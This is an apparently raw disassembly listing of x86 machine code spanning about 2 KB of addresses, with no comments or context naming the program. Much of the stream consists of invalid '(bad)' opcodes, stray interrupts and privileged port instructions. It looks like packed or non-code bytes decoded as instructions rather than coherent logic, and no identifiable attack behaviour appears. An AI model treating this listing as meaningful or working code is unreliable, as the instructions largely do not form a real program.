  425317:	jmp    0x4252ab
  425319:	shl    ebp,cl
  42531b:	sub    BYTE PTR [ebx+0xc],dl
  42531e:	cmp    esp,ebx
  425320:	in     al,dx
  425321:	sub    al,0x3b
  425323:	lock shl edx,cl
  425326:	sub    BYTE PTR [ebx],bh
  425328:	icebp  
  425329:	shl    ebx,cl
  42532b:	xchg   edx,eax
  42532c:	push   ebx
  42532d:	jecxz  0x4252fc
  42532f:	(bad)  
  425330:	std    
  425331:	int    0xa6
  425333:	std    
  425334:	cmp    edi,DWORD PTR [ebp+0x3b]
  425337:	loope  0x42530c
  425339:	jmp    0x4252cd
  42533b:	shl    ebp,cl
  42533d:	sub    BYTE PTR [ebx+0xc],dl
  425340:	aad    0xf3
  425342:	or     dl,BYTE PTR [esi-0x2723207]
  425348:	int    0x96
  42534a:	std    
  42534b:	cmp    edi,DWORD PTR [ebp+0x3b]
  42534e:	(bad)  
  425350:	jmp    0x4252e4
  425352:	shr    edx,cl
  425354:	sub    BYTE PTR [ebx+0x13],dl
  425357:	xchg   DWORD PTR [edx],eax
  425359:	int    0x8d
  42535b:	cmc    
  42535c:	int    0x96
  42535e:	cmc    
  42535f:	cmp    ebx,ecx
  425361:	cmp    edi,DWORD PTR [ebp-0x2d]
  425364:	jmp    0x1353:0x92ebd328
  42536b:	int    0x96
  42536d:	std    
  42536e:	int    0xa6
  425370:	std    
  425371:	cmp    esi,ecx
  425373:	cmp    esp,ecx
  425375:	shl    ebp,cl
  425377:	sub    bl,dl
  425379:	repz xchg edx,eax
  42537b:	push   ebx
  42537c:	aad    0x33
  42537e:	adc    eax,DWORD PTR [ebx+0x2]
  425381:	das    
  425382:	pop    es
  425383:	pop    edx
  425384:	add    BYTE PTR [eax],al
  425386:	add    ch,cl
  425388:	jbe    0x425383
  42538a:	int    0x8d
  42538c:	mov    BYTE PTR [edx-0x327ef558],ch
  425392:	jbe    0x42538d
  425394:	arpl   bx,cx
  425396:	rol    BYTE PTR [eax+eax*4+0x3bedcd96],cl
  42539d:	ins    DWORD PTR es:[edi],dx
  42539e:	pop    esi
  42539f:	jbe    0x4253ed
  4253a1:	aam    0x3a
  4253a3:	pop    esi
  4253a4:	jbe    0x42532e
  4253a6:	fdiv   DWORD PTR [edx]
  4253a8:	retf   0x8814
  4253ab:	or     DWORD PTR [esi-0x69a6d0d1],edx
  4253b1:	das    
  4253b2:	adc    dh,bl
  4253b4:	in     eax,dx
  4253b5:	add    BYTE PTR [eax+0x2f960980],0xf1
  4253bc:	lea    ebp,[edi]
  4253be:	retf   0x2f96
  4253c1:	or     DWORD PTR [eax+ecx*4],edx
  4253c4:	ins    BYTE PTR es:[edi],dx
  4253c5:	inc    ebx
  4253c6:	jbe    0x425350
  4253c8:	sub    BYTE PTR [ecx+0x7188d600],0xbd
  4253cf:	stc    
  4253d0:	std    
  4253d1:	add    BYTE PTR [eax],al
  4253d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253d4:	ror    BYTE PTR [eax-0x12326980],cl
  4253da:	adc    ch,ch
  4253dc:	cmp    al,0x84
  4253de:	add    BYTE PTR [eax+0x49bf985b],0x21
  4253e5:	xchg   BYTE PTR ds:0xc911a60a,dh
  4253eb:	jbe    0x4253ea
  4253ed:	inc    ecx
  4253ee:	and    DWORD PTR [esi-0x128936cb],eax
  4253f4:	dec    ecx
  4253f5:	sub    DWORD PTR [esi-0x4a8936cb],eax
  4253fb:	jno    0x4253b3
  4253fd:	cli    
  4253fe:	arpl   bp,cx
  425400:	jbe    0x425413
  425402:	int    0x8d
  425404:	adc    DWORD PTR [edx+0x77cfffc0],ebx
  42540a:	sub    DWORD PTR [edx-0xfc486c5],0xd392bdd3
  425414:	repnz sub BYTE PTR [ebx-0x2d],dl
  425418:	or     dh,BYTE PTR [esi-0x7]
  42541b:	leave  
  42541c:	jbe    0x4253c3
  42541e:	into   
  42541f:	and    DWORD PTR [esi-0x628936cb],eax
  425425:	inc    esi
  425426:	sbb    DWORD PTR [ebp-0x528936de],esi
  42542c:	mov    BYTE PTR [eax-0x34327f80],al
  425432:	int    0x76
  425434:	std    
  425435:	int    0x8d
  425437:	std    
  425438:	cmp    esi,eax
  42543a:	shl    edx,cl
  42543c:	sub    BYTE PTR [ebx],bh
  42543e:	jns    0x425413
  425440:	mov    ebp,0xcdd35392
  425445:	lea    edx,[ecx]
  425447:	int    0x96
  425449:	adc    DWORD PTR [ebx],edi
  42544b:	(bad)  
  42544d:	(bad)  
  42544f:	jmp    0x4253e3
  425451:	shr    edx,cl
  425453:	sub    BYTE PTR [ebx+0x13],dl
  425456:	das    
  425457:	rcl    ebx,1
  425459:	in     al,dx
  42545a:	outs   dx,BYTE PTR ds:[esi]
  42545b:	int    0x76
  42545d:	cmc    
  42545e:	int    0x8d
  425460:	cmc    
  425461:	sar    DWORD PTR [ebp-0x6d0d2cd8],cl
  425467:	push   ebx
  425468:	sar    DWORD PTR [ebx],cl
  42546a:	lds    ecx,FWORD PTR [edx]
  42546c:	jbe    0x425467
  42546e:	iret   
  42546f:	jbe    0x42546a
  425471:	jo     0x425430
  425473:	mov    ecx,0xa0000fe
  425478:	jbe    0x425473
  42547a:	int    0x76
  42547c:	stc    
  42547d:	int    0x8d
  42547f:	cmc    
  425480:	or     al,BYTE PTR ds:0xfc9dcf
  425486:	add    ch,cl
  425488:	jbe    0x425487
  42548a:	int    0x8d
  42548c:	std    
  42548d:	cmp    edi,DWORD PTR [ecx+0x3b]
  425490:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425497:	push   ebx
  425498:	rol    DWORD PTR [edi+0x760af576],cl
  42549e:	cmc    
  42549f:	int    0x76
  4254a1:	in     eax,dx
  4254a2:	int    0x8d
  4254a4:	in     eax,dx
  4254a5:	cmp    esi,eax
  4254a7:	shl    edx,cl
  4254a9:	sub    BYTE PTR [ebx],bh
  4254ab:	jns    0x425480
  4254ad:	mov    ebp,0xcdd35392
  4254b2:	(bad)  
  4254b3:	std    
  4254b4:	int    0x96
  4254b6:	std    
  4254b7:	cmp    ecx,DWORD PTR [edi]
  4254b9:	cmp    ebx,ecx
  4254bb:	shr    ebx,cl
  4254bd:	xchg   edx,eax
  4254be:	shr    edx,cl
  4254c0:	sub    BYTE PTR [ebx+0x13],dl
  4254c3:	xor    edx,ebx
  4254c5:	int    0x8d
  4254c7:	cmc    
  4254c8:	inc    ebx
  4254c9:	jge    0x4254a3
  4254cb:	mov    bl,0xcd
  4254cd:	jbe    0x425484
  4254cf:	int    0x8d
  4254d1:	mov    ch,0x3b
  4254d3:	jns    0x425510
  4254d5:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4254dc:	push   ebx
  4254dd:	ror    DWORD PTR [edx],cl
  4254df:	jbe    0x4254da
  4254e1:	leave  
  4254e2:	jbe    0x4254d1
  4254e4:	bound  ebx,QWORD PTR [edi]
  4254e6:	xchg   BYTE PTR ds:0x1ebddcd,dh
  4254ec:	add    BYTE PTR [eax-0x5a723280],0xcd
  4254f3:	jbe    0x42549a
  4254f5:	cmp    ecx,ecx
  4254f7:	shr    DWORD PTR [ebp-0x2cf0c4d8],cl
  4254fd:	jmp    0x425491
  4254ff:	push   ebx
  425500:	jge    0x4254cf
  425502:	jbe    0x4254fd
  425504:	aad    0xbd
  425506:	or     dh,BYTE PTR [esi-0x63]
  425509:	int    0x76
  42550b:	mov    dl,cl
  42550d:	or     BYTE PTR [ecx],0x76
  425510:	in     al,dx
  425511:	retf   0xec76
  425514:	int    0x8d
  425516:	stc    
  425517:	das    
  425518:	pop    ecx
  425519:	ins    DWORD PTR es:[edi],dx
  42551a:	cmp    edx,ebx
  42551c:	or     dh,BYTE PTR [esi-0xb]
  42551f:	int    0x76
  425521:	in     eax,dx
  425522:	int    0x8d
  425524:	in     eax,dx
  425525:	cmp    edi,DWORD PTR [ecx-0x2d]
  425528:	mov    ebp,0xd3f03b92
  42552d:	repnz sub BYTE PTR [ebx-0x2d],dl
  425531:	int    0x8d
  425533:	cmc    
  425534:	sub    edx,ebx
  425536:	int    0x5
  425538:	push   es
  425539:	popf   
  42553a:	cld    
  42553b:	add    BYTE PTR [eax],al
  42553d:	int    0x8d
  42553f:	popf   
  425540:	cmp    edx,ebx
  425542:	or     dh,BYTE PTR [esi-0x7]
  425545:	int    0x76
  425547:	std    
  425548:	int    0x8d
  42554a:	std    
  42554b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42554e:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425555:	push   ebx
  425556:	rol    DWORD PTR [ecx+0x76cd8876],cl
  42555c:	std    
  42555d:	int    0x8d
  42555f:	std    
  425560:	cmp    edi,DWORD PTR [ecx+0x3b]
  425563:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42556a:	push   ebx
  42556b:	sar    DWORD PTR [esi],cl
  42556d:	jbe    0x42551c
  42556f:	int    0x76
  425571:	adc    ebp,ecx
  425573:	lea    edx,[ecx]
  425575:	cmp    esi,eax
  425577:	cmp    edi,DWORD PTR [ecx-0x2d]
  42557a:	repnz sub bl,dl
  42557d:	mov    ebp,0xcdd35392
  425582:	lea    ebp,[ebp+0x62f7d43]
  425588:	imul   eax,DWORD PTR [eax],0x0
  42558b:	add    ch,cl
  42558d:	jbe    0x425544
  42558f:	int    0x8d
  425591:	mov    ch,0x3b
  425593:	jns    0x4255d0
  425595:	lock shl edx,cl
  425598:	sub    bl,dl
  42559a:	mov    ebp,0xd353aa92
  42559f:	int    0x8d
  4255a1:	stc    
  4255a2:	test   al,0x3b
  4255a4:	shl    DWORD PTR [ebx-0x35],cl
  4255a7:	rol    BYTE PTR [eax+eax*4+0x4edcd96],cl
  4255ae:	in     eax,dx
  4255af:	xor    BYTE PTR [ebx],bh
  4255b1:	retf   
  4255b2:	pop    ebx
  4255b3:	call   0xbb05:0x2f888d5e
  4255ba:	add    BYTE PTR [eax+0x2f024380],0x5
  4255c1:	rol    DWORD PTR [eax-0x44d07f80],1
  4255c7:	cwde   
  4255c8:	sub    al,0x5d
  4255ca:	lahf   
  4255cb:	xor    eax,0x8d0a8080
  4255d0:	std    
  4255d1:	or     cl,BYTE PTR [ebp+0xaf13b11]
  4255d7:	(bad)  
  4255d8:	stc    
  4255d9:	mov    eax,0xe3b813cd
  4255de:	retf   
  4255df:	cmp    eax,DWORD PTR [eax]
  4255e1:	leave  
  4255e2:	jbe    0x4255d9
  4255e4:	adc    al,0x80
  4255e6:	add    BYTE PTR [eax+0x77fa43b8],0xc4
  4255ed:	mov    eax,0xb8fde6cd
  4255f2:	jecxz  0x4255bd
  4255f4:	mov    eax,0xbb2ff93b
  4255f9:	(bad)  
  4255fa:	stc    
  4255fb:	iret   
  4255fc:	dec    esp
  4255fd:	into   
  4255fe:	mov    eax,0xd692de5e
  425603:	pop    edx
  425604:	das    
  425605:	mov    ebx,0xf58d0a89
  42560a:	mov    eax,0x4dd67d43
  42560f:	das    
  425610:	mov    ebx,0xa6cdfd8d
  425615:	mov    BYTE PTR [ecx],al
  425617:	fs push ds
  425619:	adc    ah,0x3b
  42561c:	das    
  42561d:	mov    ebx,0xa6cdfd8d
  425622:	mov    BYTE PTR [eax+0x1e4c692f],bh
  425628:	mov    eax,0x3bb8d3e3
  42562d:	jge    0x4255e7
  42562f:	pop    esi
  425630:	(bad)  
  425631:	cmc    
  425632:	aam    0x23
  425634:	leave  
  425635:	jbe    0x42562c
  425637:	sbb    BYTE PTR [eax+0x76008080],al
  42563d:	stc    
  42563e:	int    0x7d
  425640:	mov    eax,0xb82c8e3b
  425645:	jecxz  0x425612
  425647:	mov    eax,0x82f98d5e
  42564c:	inc    ecx
  42564d:	in     al,dx
  42564e:	dec    edx
  42564f:	add    BYTE PTR [esi+0x11],dh
  425652:	leave  
  425653:	jbe    0x42564a
  425655:	push   ss
  425656:	add    BYTE PTR [eax-0x1944d080],0xfd
  42565d:	int    0xa6
  42565f:	mov    BYTE PTR [ebx],bh
  425661:	retf   
  425662:	pop    esp
  425663:	dec    esp
  425664:	sub    dl,ah
  425666:	push   ss
  425667:	add    BYTE PTR [esi-0x3],dh
  42566a:	add    al,0xe6
  42566c:	cmc    
  42566d:	sbb    BYTE PTR [edi],ch
  42566f:	push   es
  425670:	jb     0x425672
  425672:	add    BYTE PTR [eax],al
  425674:	cmp    ebp,DWORD PTR [ebp-0x56]
  425677:	arpl   bx,cx
  425679:	rol    BYTE PTR [eax+eax*4-0x47ee7233],cl
  425680:	jecxz  0x425655
  425682:	mov    eax,0x6d3b7d3b
  425687:	mov    eax,0x2f2c8e43
  42568c:	adc    eax,0x96b9ec6d
  425691:	int    0xed
  425693:	add    al,0xed
  425695:	mov    esp,0xc09a985b
  42569a:	inc    esp
  42569b:	add    dh,dl
  42569d:	mov    ch,cl
  42569f:	adc    DWORD PTR [ebp+0xf90b],edi
  4256a5:	iret   
  4256a6:	js     0x4256da
  4256a8:	or     dh,BYTE PTR [esi+0x25]
  4256ab:	iret   
  4256ac:	js     0x425722
  4256ae:	or     dh,BYTE PTR [esi+0x2d]
  4256b1:	iret   
  4256b2:	js     0x42566c
  4256b4:	or     dh,BYTE PTR [esi+0x35]
  4256b7:	iret   
  4256b8:	pop    es
  4256b9:	or     DWORD PTR [eax+0x760a8080],eax
  4256bf:	cmp    eax,0x804107cf
  4256c4:	add    BYTE PTR [eax-0x30ba89f6],0x7
  4256cb:	or     eax,0xa808080
  4256d0:	jbe    0x4256a2
  4256d2:	iret   
  4256d3:	pop    es
  4256d4:	out    dx,eax
  4256d5:	add    BYTE PTR [eax+0x55760a80],0xcf
  4256dc:	pop    es
  4256dd:	xor    BYTE PTR [ecx+0x760a8080],al
  4256e3:	pop    ebp
  4256e4:	iret   
  4256e5:	pop    es
  4256e6:	inc    edx
  4256e7:	add    DWORD PTR [eax+0x65760a80],0xcf1dd60a
  4256f1:	pop    es
  4256f2:	xchg   esp,eax
  4256f3:	add    DWORD PTR [eax+0x6d760a80],0x813d07cd
  4256fd:	add    BYTE PTR [eax-0x25c4af33],0xa
  425704:	xchg   esi,eax
  425705:	icebp  
  425706:	or     dl,BYTE PTR [esi-0x6269f56b]
  42570c:	or     dl,BYTE PTR [esi+0x7d76c9a5]
  425712:	(bad)  
  425713:	mov    cl,0xde
  425715:	adc    ebx,DWORD PTR [ebp-0x43]
  425718:	or     ah,BYTE PTR [ebx]
  42571a:	and    eax,0xcd0d760a
  42571f:	lea    edi,[ebp-0x33]
  425722:	out    0xd,al
  425724:	cmp    edi,ecx
  425726:	adc    al,BYTE PTR [edx]
  425728:	jnp    0x425761
  42572a:	ficom  WORD PTR [ebx]
  42572c:	das    
  42572d:	inc    ebp
  42572e:	cli    
  42572f:	xchg   edx,eax
  425730:	rcl    DWORD PTR [eax],cl
  425732:	xchg   edx,eax
  425733:	or     ah,dh
  425735:	mov    ch,0xcd
  425737:	out    0x7d,al
  425739:	int    0xa6
  42573b:	or     eax,0x3be1cd
  425740:	cmp    eax,DWORD PTR [ebx]
  425742:	shl    ebp,cl
  425744:	sub    BYTE PTR [ebx-0x10],dl
  425747:	int    0xe6
  425749:	mov    ch,0x61
  42574b:	add    BYTE PTR [eax-0x1dc49380],0x53
  425752:	cld    
  425753:	push   ebx
  425754:	lock or dl,dh
  425757:	stc    
  425758:	das    
  425759:	add    eax,0x808080f2
  42575e:	adc    dh,BYTE PTR [esi-0xf]
  425761:	(bad)  
  425762:	mov    esp,0xeb5f8bbd
  425767:	or     ah,BYTE PTR [ebx]
  425769:	and    eax,0x12958d31
  42576e:	jbe    0x42570d
  425770:	(bad)  
  425771:	mov    esp,0x8d318790
  425776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425777:	int    0x8d
  425779:	jge    0x425748
  42577b:	(bad)  
  42577c:	or     eax,0xcd7de6cd
  425781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425782:	or     eax,0x212113b
  425787:	jnp    0x4257c0
  425789:	ficom  WORD PTR [ebx]
  42578b:	das    
  42578c:	inc    ebp
  42578d:	add    dl,BYTE PTR [edx-0x2cd7162d]
  425793:	out    dx,eax
  425794:	xchg   edx,eax
  425795:	cmp    ebx,ebp
  425797:	cmp    eax,DWORD PTR [ebx]
  425799:	push   ebx
  42579a:	or     al,0x53
  42579c:	clc    
  42579d:	add    al,0xd3
  42579f:	add    BYTE PTR [ecx+ebx*4],al
  4257a2:	add    BYTE PTR [edx],cl
  4257a4:	lea    edi,[ebp+0xa]
  4257a7:	(bad)  
  4257a8:	or     eax,0x53f18dcd
  4257ad:	lea    edx,[ebp+0x761223d4]
  4257b3:	icebp  
  4257b4:	mov    edx,DWORD PTR [ebx]
  4257b6:	dec    edx
  4257b7:	stc    
  4257b8:	pop    edi
  4257b9:	sbb    al,bl
  4257bb:	mov    ch,0x6b
  4257bd:	xor    DWORD PTR [ebp-0x6289ed6b],ecx
  4257c3:	(bad)
  4257c6:	std    
  4257c7:	xor    DWORD PTR [ebp+0x121ceca5],ecx
  4257cd:	(bad)  
  4257ce:	icebp  
  4257cf:	(bad)  
  4257d0:	mov    esp,0x76897abd
  4257d5:	xchg   ebp,eax
  4257d6:	adc    dh,BYTE PTR [esi-0x6f433963]
  4257dc:	add    al,0x12
  4257de:	mov    dh,0xa5
  4257e0:	jmp    0x4257ec
  4257e2:	and    esp,DWORD PTR ds:0xcd7d8dcd
  4257e8:	lea    ecx,ds:0xcd7de6cd
  4257ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257ef:	or     eax,0x92fc352f
  4257f4:	shr    ebx,cl
  4257f6:	sub    BYTE PTR [ebx],bh
  4257f8:	not    DWORD PTR [ebx-0xc]
  4257fb:	shr    ecx,cl
  4257fd:	xchg   edx,eax
  4257fe:	push   ebx
  4257ff:	lock adc al,BYTE PTR [edx]
  425802:	(bad)  
  425803:	aaa    
  425804:	ficom  WORD PTR [ebx]
  425806:	or     cl,BYTE PTR [ebp+0xa113b7d]
  42580c:	(bad)  
  42580d:	or     eax,0xcd7d8dcd
  425812:	(bad)  
  425813:	or     eax,0xcd7de6cd
  425818:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425819:	or     eax,0x212113b
  42581e:	jnp    0x425857
  425820:	ficom  WORD PTR [ebx]
  425822:	das    
  425823:	inc    ebp
  425824:	add    dl,BYTE PTR [edx-0x2cd7162d]
  42582a:	out    dx,eax
  42582b:	xchg   edx,eax
  42582c:	cmp    ebx,ebp
  42582e:	cmp    eax,DWORD PTR [ebx]
  425830:	push   ebx
  425831:	or     al,0x53
  425833:	clc    
  425834:	push   ebx
  425835:	comiss xmm0,DWORD PTR [esi]
  425838:	xor    al,BYTE PTR [eax]
  42583a:	add    BYTE PTR [eax],al
  42583c:	int    0xd6
  42583e:	stc    
  42583f:	push   es
  425840:	imul   DWORD PTR [edi]
  425842:	add    eax,0x808080d1
  425847:	int    0x78
  425849:	fs int 0xe4
  42584c:	push   eax
  42584d:	fadd   QWORD PTR [edi+0x349acdff]
  425853:	int    0x6f
  425855:	and    al,0xcd
  425857:	jp     0x425885
  425859:	int    0xaa
  42585b:	sbb    al,0x87
  42585d:	cdq    
  42585e:	or     dl,BYTE PTR [esi+0x149acd0d]
  425864:	xchg   DWORD PTR [edi],ecx
  425866:	xchg   DWORD PTR [ecx+0xa],edi
  425869:	(bad)  
  42586a:	in     eax,dx
  42586b:	or     dh,BYTE PTR [esi-0x6b]
  42586e:	or     dl,BYTE PTR [esi+0x7bd543f5]
  425874:	xchg   DWORD PTR [edx],ecx
  425876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425877:	cmc    
  425878:	cmp    ebx,edx
  42587a:	or     dl,BYTE PTR [esi-0xa69a15b]
  425880:	fcom   st(4)
  425882:	in     al,dx
  425883:	xchg   ebp,ecx
  425885:	jbe    0x42581c
  425887:	int    0xa6
  425889:	or     eax,0x5b24bb2f
  42588e:	inc    ebx
  42588f:	call   0x14aa:0x436b771c
  425896:	ja     0x425840
  425898:	int    0x84
  42589a:	mov    al,0xcd
  42589c:	xchg   esi,eax
  42589d:	mov    ch,cl
  42589f:	and    al,0x1f
  4258a1:	or     dl,BYTE PTR [esi-0x30867803]
  4258a7:	xchg   esi,eax
  4258a8:	sbb    eax,0x9633a987
  4258ad:	mov    BYTE PTR [edx],cl
  4258af:	jbe    0x4258c2
  4258b1:	or     dl,BYTE PTR [esi-0x4a89368b]
  4258b7:	push   ebx
  4258b8:	add    BYTE PTR [eax-0x2693280],0x4
  4258bf:	pusha  
  4258c0:	adc    dh,0x28
  4258c3:	jo     0x425892
  4258c5:	jbe    0x42593c
  4258c7:	int    0x54
  4258c9:	xor    BYTE PTR [ebp+0xfddd],bh
  4258cf:	int    0xd6
  4258d1:	stc    
  4258d2:	int    0x8d
  4258d4:	in     eax,dx
  4258d5:	push   es
  4258d6:	ins    DWORD PTR es:[edi],dx
  4258d7:	aam    0x85
  4258d9:	int    0x76
  4258db:	std    
  4258dc:	or     bl,BYTE PTR [ecx*8+0x76041176]
  4258e3:	std    
  4258e4:	test   BYTE PTR [eax],al
  4258e6:	lea    esi,[ebp-0x69321c2a]
  4258ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4258ed:	push   edx
  4258ee:	or     dl,BYTE PTR [esi-0xa69bc5b]
  4258f4:	or     dh,0xaa
  4258f7:	int    0x79
  4258f9:	test   al,0x63
  4258fb:	retf   
  4258fc:	rol    BYTE PTR [eax+eax*4-0x6712326a],cl
  425903:	int    0xd6
  425905:	mov    BYTE PTR [eax],al
  425907:	pop    ecx
  425908:	adc    DWORD PTR [ecx+0x76cd8080],eax
  42590e:	mov    BYTE PTR [ebp+0xfee4],bh
  425914:	int    0x7
  425916:	cmp    eax,0x3b808081
  42591b:	retf   
  42591c:	pop    esi
  42591d:	mov    BYTE PTR [eax-0x322ce8d1],ch
  425923:	shl    DWORD PTR [esi-0x327f7b2e],cl
  425929:	fwait
  42592a:	sbb    eax,0x5b808081
  42592f:	cwde   
  425930:	int    0x11
  425932:	pop    ebp
  425933:	lahf   
  425934:	xor    eax,0x4eec8080
  425939:	cmp    edi,DWORD PTR [ebp-0x48]
  42593c:	jecxz  0x425909
  42593e:	mov    eax,0xd2044a0a
  425943:	xchg   edx,eax
  425944:	add    al,0x79
  425946:	xchg   edx,eax
  425947:	das    
  425948:	mov    ebx,0x7d43b84e
  42594d:	(bad)  
  42594e:	repz cmp ebp,DWORD PTR [ebp-0x58]
  425952:	mov    eax,0x8cd920a
  425957:	sbb    eax,0x63808081
  42595c:	lds    ebx,FWORD PTR [edx+0x7cdf9cd]
  425962:	sbb    eax,0xd3808081
  425967:	jmp    0xed0be0f2
  42596c:	dec    edx
  42596d:	add    DWORD PTR [edx],eax
  42596f:	add    DWORD PTR [ecx],0xffffffeb
  425972:	mov    esi,0x526c8809
  425977:	retf   0x14a
  42597a:	cli    
  42597b:	sbb    dh,dl
  42597d:	adc    BYTE PTR [ecx-0x80],bh
  425980:	or     ch,0x7
  425983:	sbb    eax,0x87808081
  425988:	leave  
  425989:	stos   BYTE PTR es:[edi],al
  42598a:	lds    edx,FWORD PTR [esi-0x12ed1233]
  425990:	mov    al,0x80
  425992:	add    BYTE PTR [eax+0xabd5f5b],0x23
  425999:	and    eax,0x76c99a98
  42599e:	cmc    
  42599f:	xchg   ecx,eax
  4259a0:	aaa    
  4259a1:	ficom  WORD PTR [ebx]
  4259a3:	or     cl,BYTE PTR [ebp-0x12893607]
  4259a9:	(bad)  
  4259aa:	aaa    
  4259ab:	ficom  WORD PTR [ebx]
  4259ad:	or     cl,BYTE PTR [ebp-0x3692c4ef]
  4259b3:	jbe    0x425972
  4259b5:	dec    ecx
  4259b6:	and    DWORD PTR [esi-0x28936cb],eax
  4259bc:	inc    ecx
  4259bd:	and    DWORD PTR [esi-0xe8936cb],eax
  4259c3:	out    0x37,al
  4259c5:	ficom  WORD PTR [ebx]
  4259c7:	or     cl,BYTE PTR [ebp+0x5d76c995]
  4259cd:	fidiv  WORD PTR [edi]
  4259cf:	ficom  WORD PTR [ebx]
  4259d1:	or     cl,BYTE PTR [ebp-0x1289329b]
  4259d7:	int    0x96
  4259d9:	adc    DWORD PTR [edi],ebp
  4259db:	inc    ebp
  4259dc:	icebp  
  4259dd:	xchg   edx,eax
  4259de:	shl    ebx,cl
  4259e0:	xchg   edx,eax
  4259e1:	int    0x96
  4259e3:	in     eax,dx
  4259e4:	int    0xd6
  4259e6:	adc    ebx,edx
  4259e8:	jmp    0x4229:0xbea6c328
  4259ef:	cmp    ecx,ecx
  4259f1:	cmp    esi,edi
  4259f3:	push   ebx
  4259f4:	jns    0x425a00
  4259f6:	jbe    0x42599d
  4259f8:	iret   
  4259f9:	jbe    0x4259a8
  4259fb:	or     dh,BYTE PTR [esi+0xd]
  4259fe:	int    0x76
  425a00:	or     eax,0x8621d169
  425a05:	xor    eax,0x37b680c9
  425a0a:	ficom  WORD PTR [ebx]
  425a0c:	or     bh,BYTE PTR [esp+eax*4-0x33]
  425a10:	(bad)  
  425a11:	std    
  425a12:	int    0x96
  425a14:	std    
  425a15:	cmp    ecx,DWORD PTR [edi]
  425a17:	shr    ebx,cl
  425a19:	xchg   edx,eax
  425a1a:	sar    bh,0x9c
  425a1d:	cmp    esi,ecx
  425a1f:	shr    edx,cl
  425a21:	sub    BYTE PTR [ebx+0x13],dl
  425a24:	int    0x96
  425a26:	std    
  425a27:	int    0xa6
  425a29:	std    
  425a2a:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a30:	popf   
  425a31:	shl    ebp,cl
  425a33:	sub    BYTE PTR [ebx-0x2b],dl
  425a36:	xchg   DWORD PTR [ebx],edx
  425a38:	int    0x96
  425a3a:	std    
  425a3b:	int    0xa6
  425a3d:	std    
  425a3e:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a44:	popf   
  425a45:	shl    ebp,cl
  425a47:	sub    BYTE PTR [ebx-0x2b],dl
  425a4a:	xchg   DWORD PTR [ebx],edx
  425a4c:	int    0x96
  425a4e:	std    
  425a4f:	int    0xa6
  425a51:	std    
  425a52:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a58:	popf   
  425a59:	shl    ebp,cl
  425a5b:	sub    BYTE PTR [ebx-0x2b],dl
  425a5e:	xchg   DWORD PTR [ebx],edx
  425a60:	or     cl,bh
  425a62:	nop
  425a63:	add    BYTE PTR [eax],al
  425a65:	add    ch,cl
  425a67:	lea    edi,[ebp+0x3bbd96cd]
  425a6d:	icebp  
  425a6e:	cmp    ecx,DWORD PTR [edi]
  425a70:	shr    edx,cl
  425a72:	sub    bl,dl
  425a74:	jmp    0x425a08
  425a76:	push   ebx
  425a77:	adc    ecx,ebp
  425a79:	xchg   esi,eax
  425a7a:	mov    ebp,0x3bbda6cd
  425a7f:	cdq    
  425a80:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425a86:	in     eax,0x28
  425a88:	push   ebx
  425a89:	aad    0xa
  425a8b:	int3   
  425a8c:	pop    ss
  425a8d:	aam    0x0
  425a8f:	add    BYTE PTR [eax],al
  425a91:	int    0x8d
  425a93:	dec    esp
  425a94:	int    0x89
  425a96:	int    0x96
  425a98:	std    
  425a99:	int    0xa6
  425a9b:	std    
  425a9c:	int    0x7e
  425a9e:	jo     0x425adb
  425aa0:	popf   
  425aa1:	cmp    ebx,DWORD PTR [ecx-0x2c6d0c2d]
  425aa7:	in     eax,0x28
  425aa9:	push   ebx
  425aaa:	aad    0xa
  425aac:	int3   
  425aad:	pop    ss
  425aae:	aam    0x0
  425ab0:	add    BYTE PTR [eax],al
  425ab2:	int    0x8d
  425ab4:	xor    ch,cl
  425ab6:	xchg   esi,eax
  425ab7:	xor    BYTE PTR [ebx],bh
  425ab9:	icebp  
  425aba:	cmp    ecx,DWORD PTR [edi]
  425abc:	shr    edx,cl
  425abe:	sub    bl,dl
  425ac0:	jmp    0x425a54
  425ac2:	push   ebx
  425ac3:	adc    ecx,ebp
  425ac5:	xchg   esi,eax
  425ac6:	std    
  425ac7:	int    0xa6
  425ac9:	std    
  425aca:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  425ad0:	cdq    
  425ad1:	shl    ebx,cl
  425ad3:	xchg   edx,eax
  425ad4:	shl    ebp,cl
  425ad6:	sub    BYTE PTR [ebx-0x2b],dl
  425ad9:	int    0xa6
  425adb:	std    
  425adc:	cmp    edi,DWORD PTR [ecx-0x2d]
  425adf:	mov    ebp,0xfff40492
  425ae4:	shl    ebp,cl
  425ae6:	sub    BYTE PTR [ebx-0x3b],dl
  425ae9:	xchg   ecx,esi
  425aeb:	int    0x76
  425aed:	adc    al,0xa
  425aef:	int3   
  425af0:	pop    ss
  425af1:	aam    0x0
  425af3:	add    BYTE PTR [eax],al
  425af5:	int    0x8d
  425af7:	adc    al,0x4
  425af9:	add    bh,bh
  425afb:	shl    edx,cl
  425afd:	sub    BYTE PTR [ebx],bh
  425aff:	jns    0x425ad4
  425b01:	mov    ebp,0xcdd35392
  425b06:	(bad)  
  425b07:	std    
  425b08:	int    0x96
  425b0a:	std    
  425b0b:	add    al,0xfb
  425b0d:	(bad)  
  425b0e:	cmp    ecx,DWORD PTR [edi]
  425b10:	shr    edx,cl
  425b12:	sub    bl,dl
  425b14:	jmp    0x425aa8
  425b16:	push   ebx
  425b17:	adc    ecx,ebp
  425b19:	xchg   esi,eax
  425b1a:	std    
  425b1b:	int    0xa6
  425b1d:	std    
  425b1e:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425b24:	repz xchg edx,eax
  425b26:	shl    ebp,cl
  425b28:	sub    BYTE PTR [ebx-0x2b],dl
  425b2b:	xchg   DWORD PTR [ebx],edx
